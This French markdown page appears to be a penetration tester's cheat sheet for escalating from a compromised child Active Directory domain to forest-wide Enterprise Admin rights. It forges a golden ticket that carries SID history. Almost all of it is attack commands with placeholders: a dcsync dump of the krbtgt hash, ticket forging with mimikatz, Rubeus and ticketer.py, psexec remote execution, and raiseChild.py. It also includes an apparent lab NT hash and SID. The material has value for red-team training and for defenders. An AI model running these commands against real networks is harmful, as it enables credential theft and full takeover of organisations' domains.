---
public: true # set to true to make the article publishable
---

Il s'agit d'une attaque offrant la possibilité de compromettre une forêt AD à partir d'un domaine compromis.

Il s'appuie sur la création d'un golden ticket qui contiendra un SID history égal au SID du groupe de sécurité administrateur de l'entreprise.

## Prérequis

- Disposer du Hash NTLM (LM:NT) du compte krbtgt du domaine enfant (récupérable via  `lsadump::dcsync /user:krbtgt@LOGISTICS.INLANEFREIGHT.LOCAL`)

## Attaque

### Sous Windows
#### Récupération des éléments  nécessaires

```shell
# récupération du SID du groupe "administtrateurs de l'entreprise"
 Get-DomainGroup -Domain <PARENT DOMAIN> | ? {$_.SamAccountName -like "Enterprise Admins"}| Select -ExpandProperty objectsid

# récupération du hash du krbtgt du domaine compromis
mimikatz
 lsadump::dcsync /user:krbtgt@<domain>

# récupération du sid du groupe entreprise admin
get-domaingroup -Domain inlanefreight.local|?{$_.samaccountname -like "ent*admin*"}|select name,objectsid

# récupération du sid du domaine 
get-domainsid
```

#### Mimikatz

```shell
# création du golden ticket
mimikatz
 kerberos::golden /user:<fake or real user> /domain:<compromised domain> /sid:<compromised domain s SID> /sids:<Group SID to privesc> /rc4:<compromised domain s KRBTGT hash> /ptt
```

#### Rubeus

```shell
.\Rubeus.exe golden /rc4:<compromised domain s KRBTGT hash> /domain:<compromised domain> /sid:<compromised domain s SID>  /sids:<Group SID to privesc> /user:<fake or real user> /ptt
```

### Sous Linux

#### Récupération des éléments  nécessaires

```shell
# récupération du SID du groupe "administtrateurs de l'entreprise"
 lookupsid.py

# récupération du hash du krbtgt du domaine compromis
secretsdump.py <compromised domain FQDN>/<domain admin user>:<password@<dc ip> -just-dc -just-dc-user <domain netbios>/krbtgt

9d765b482771505cbe97411065964d5f
# récupération du sid du groupe entreprise admin
lookupsid.py <compromised domain FQDN>/<domain admin user>:<password@<dc ip wher Enterprise admin is defined> | grep -Ei 'ent.*adm.*'


S-1-5-21-3842939050-3880317879-2865463114-519
# récupération du sid du domaine 
lookupsid.py <compromised domain FQDN>/<domain admin user>:<password@<dc ip wher Enterprise admin is defined> | head
```

#### ticketer.py

```shell
# création du golden ticket
ticketer.py -nthash <compromised domain s KRBTGT hash> -domain <compromised domain>  -domain-sid <compromised domain s SID> -extra-sid <Group SID to privesc> <fake or real user>

# utilisation
export KRB5CCNAME=$PWD/<fake or real user>.ccache

psexec.py -k -no-pass <fake or real user>@<target FQDN> -dc-ip <dc ip> -target-ip <target-ip>
```

### raiseChild.py

```shell
raiseChild.py <compromised domain FQDN>/<domain admin user>:<password> -target-exec <target ip>
```
